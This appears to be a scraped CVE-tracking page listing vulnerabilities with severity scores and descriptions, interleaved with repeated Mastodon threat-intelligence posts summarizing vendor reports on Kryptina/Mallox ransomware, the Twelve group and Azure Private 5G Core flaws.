The staging server includes an exploit for CVE-2024-21338 (7.8 high, disclosed 13 February 2024 by Microsoft, reported by Avast as an exploited zero-day used by DPRK hackers, in CISA's KEV Catalog) Windows Kernel Elevation of Privilege Vulnerability. There are other Windows-focused droppers and tools on the server. Indicators of compromise are provided.

#threatintel #kryptina #mallox #raas #ransomware #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC #CVE_2024_21338 #dropper

##
screaminggoat@infosec.exchange at 2024-09-23T11:20:50.000Z ##

SentinelOne: Kryptina RaaS | From Unsellable Cast-Off to Enterprise Ransomware
Kryptina is a free and open-source Ransomware-as-a-Service (RaaS) platform written for Linux, previously reported by SentinelOne in February 2024. In May 2024, a Mallox affiliate leaked staging server data, revealing that their Linux ransomware was based on a modified version of Kryptina. The affiliate made superficial changes to source code and documentation, stripping Kryptina branding but retaining core functionality. The adoption of Kryptina by Mallox affiliates exemplifies the commoditization of ransomware tools, complicating malware tracking as affiliates blend different codebases into new variants. SentinelOne provides a brief history of both Kryptina and Mallox, description of Kryptina features and a comparison with the Mallox makefiles.

The staging server includes an exploit for CVE-2024-21338 (7.8 high, disclosed 13 February 2024 by Microsoft, reported by Avast as an exploited zero-day used by DPRK hackers, in CISA's KEV Catalog) Windows Kernel Elevation of Privilege Vulnerability. There are other Windows-focused droppers and tools on the server. Indicators of compromise are provided.

#threatintel #kryptina #mallox #raas #ransomware #infosec #cybersecurity #cyberthreatintelligence #CTI #IOC #CVE_2024_21338 #dropper

##

CVE-2024-20685
(5.9 MEDIUM)

EPSS: 0.07%

updated 2024-04-10T13:24:22.187000

1 posts

Azure Private 5G Core Denial of Service Vulnerability

screaminggoat@infosec.exchange at 2024-09-18T12:49:44.000Z ##

Trend Micro: Vulnerabilities in Cellular Packet Cores Part IV: Authentication
Trend Micro describes two vulnerabilities in Microsoft Azure Private 5G Core (AP5GC). This article is the latest in a series about vulnerabilities in cellular packet cores, using various commercial and open-source products as examples. They are focused more on systemic issues and attack vectors. CVE-2024-20685 (5.9 medium, assigned 09 April 2024) Azure Private 5G Core Denial of Service Vulnerability can lead to potential service outages. Another yet-unassigned vulnerability ZDI-CAN-23960 is titled Microsoft Azure Private 5G Core Un- Authenticated Base Station Override, would disconnect and replace attached base stations, disrupting network operations. Trend Micro gives an overview of cellular network architecture, describes the vulnerabilities and their impact.

#microsoft #ap5gc #cellularnetwork #vulnerability #CVE_2024_20685

CVE-2023-38646
(9.8 CRITICAL)

EPSS: 86.55%

updated 2024-02-15T16:15:45.380000

2 posts

Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow attackers to execute arbitrary commands on the server, at the server's privilege level. Authentication is not required for exploitation. The other fixed versions are 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, and 1.43.7.2.

(5.8 MEDIUM)

EPSS: 0.34%

updated 2024-02-15T06:15:45.653000

2 posts

An OS command injection vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow users to execute commands via a network. We have already fixed the vulnerability in the following versions: QTS 5.1.5.2645 build 20240116 and later QuTS hero h5.1.5.2647 build 20240118 and later QuTScloud c5.1.5.2651 and later

CVE-2021-21972
(9.8 CRITICAL)

EPSS: 97.36%

updated 2024-02-13T16:44:51.980000

2 posts

The vSphere Client (HTML5) contains a remote code execution vulnerability in a vCenter Server plugin. A malicious actor with network access to port 443 may exploit this issue to execute commands with unrestricted privileges on the underlying operating system that hosts vCenter Server. This affects VMware vCenter Server (7.x before 7.0 U1c, 6.7 before 6.7 U3l and 6.5 before 6.5 U3n) and VMware Clou

screaminggoat at 2024-09-20T14:31:31.886Z ##

Kaspersky: -=TWELVE=- is back
Kaspersky reports that Twelve, a hacktivism and espionage-oriented threat group that targets Russian government organizations has been observed in a June 2024 cyber attack. Twelve shares infrastructure and TTPs with the DARKSTAR ransomware group (aka Shadow or Comet), which suggests that the two belong to the same syndicate or activity cluster. Kaspersky describes their attack chain, which includes exploiting VMware vCenter vulnerabilities CVE-2021-21972 and CVE-2021-22005 (9.8 critical, remote code execution and arbitrary file upload, respectively) to install the FaceFish backdoor. The Lockbit 3.0 and Chaos ransomware used in the attacks creates a ransom note that lacks any contact methods (indicating that Twelve isn't interested in financial extortion). If that wasn't obvious enough, then the Shamoon wiper executed on infrastructure after the ransomware encryption is a good tell. Indicators of compromise provided.

#threatintel #twelve #hactivism #darkstar #infosec #IOC #CVE_2021_21972 #CVE_2021_22005 #vmware #vcenter #facefish #vulnerability #wiper #shamoon #ransomware #cybersecurity #cyberthreatintelligence #cti #cyberespionage #lockbit #chaos

##
screaminggoat@infosec.exchange at 2024-09-20T14:31:31.000Z ##

Kaspersky: -=TWELVE=- is back
Kaspersky reports that Twelve, a hacktivism and espionage-oriented threat group that targets Russian government organizations has been observed in a June 2024 cyber attack. Twelve shares infrastructure and TTPs with the DARKSTAR ransomware group (aka Shadow or Comet), which suggests that the two belong to the same syndicate or activity cluster. Kaspersky describes their attack chain, which includes exploiting VMware vCenter vulnerabilities CVE-2021-21972 and CVE-2021-22005 (9.8 critical, remote code execution and arbitrary file upload, respectively) to install the FaceFish backdoor. The Lockbit 3.0 and Chaos ransomware used in the attacks creates a ransom note that lacks any contact methods (indicating that Twelve isn't interested in financial extortion). If that wasn't obvious enough, then the Shamoon wiper executed on infrastructure after the ransomware encryption is a good tell. Indicators of compromise provided.

#threatintel #twelve #hactivism #darkstar #infosec #IOC #CVE_2021_21972 #CVE_2021_22005 #vmware #vcenter #facefish #vulnerability #wiper #shamoon #ransomware #cybersecurity #cyberthreatintelligence #cti #cyberespionage #lockbit #chaos

##

CVE-2023-25690
(9.8 CRITICAL)

EPSS: 1.48%

updated 2024-01-02T18:30:18

2 posts

Some mod_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack. Configurations are affected when mod_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using variable

3 repos

https://github.com/tbachvarova/linux-apache-fix-mod_rewrite-spaceInURL

https://github.com/thanhlam-attt/CVE-2023-25690

https://github.com/dhmosfunk/CVE-2023-25690-POC

##

CVE-2023-48693
(9.8 CRITICAL)

EPSS: 0.24%

updated 2023-12-08T19:24:21.413000

2 posts

Azure RTOS ThreadX is an advanced real-time operating system (RTOS) designed specifically for deeply embedded applications. An attacker can cause arbitrary read and write due to vulnerability in parameter checking mechanism in Azure RTOS ThreadX, which may lead to privilege escalation. The affected components include RTOS ThreadX v6.2.1 and below. The fixes have been included in ThreadX release 6

david_chisnall at 2024-09-20T11:03:19.966Z ##

For those who missed SCI Semiconductor's demo at the Digital Security by Design (DSbD) all hands meeting this week, meet Hugh the Lightbulb! We introduced a memory safety bug in the TCP/IP stack similar to CVE-2023-48693 from Azure RTOS in December or the CVE-2020-6007 in Philips Hue lightbulbs. In other systems, these allowed remote arbitrary-code execution. We showed that, in a #CHERIoT system such as SCI's upcoming ICENI line, this becomes a couple of seconds of network disconnection with no impact on the rest of the system.

All of the code for Hugh is available for people to play with.

##
david_chisnall@infosec.exchange at 2024-09-20T11:03:19.000Z ##

For those who missed SCI Semiconductor's demo at the Digital Security by Design (DSbD) all hands meeting this week, meet Hugh the Lightbulb! We introduced a memory safety bug in the TCP/IP stack similar to CVE-2023-48693 from Azure RTOS in December or the CVE-2020-6007 in Philips Hue lightbulbs. In other systems, these allowed remote arbitrary-code execution. We showed that, in a #CHERIoT system such as SCI's upcoming ICENI line, this becomes a couple of seconds of network disconnection with no impact on the rest of the system.

All of the code for Hugh is available for people to play with.

##

CVE-2023-3368
(9.8 CRITICAL)

EPSS: 94.22%

updated 2023-12-04T18:57:35.040000

2 posts

Command injection in `/main/webservices/additional_webservices.php` in Chamilo LMS <= v1.11.20 allows unauthenticated attackers to obtain remote code execution via improper neutralisation of special characters. This is a bypass of CVE-2023-34960.

Nuclei template
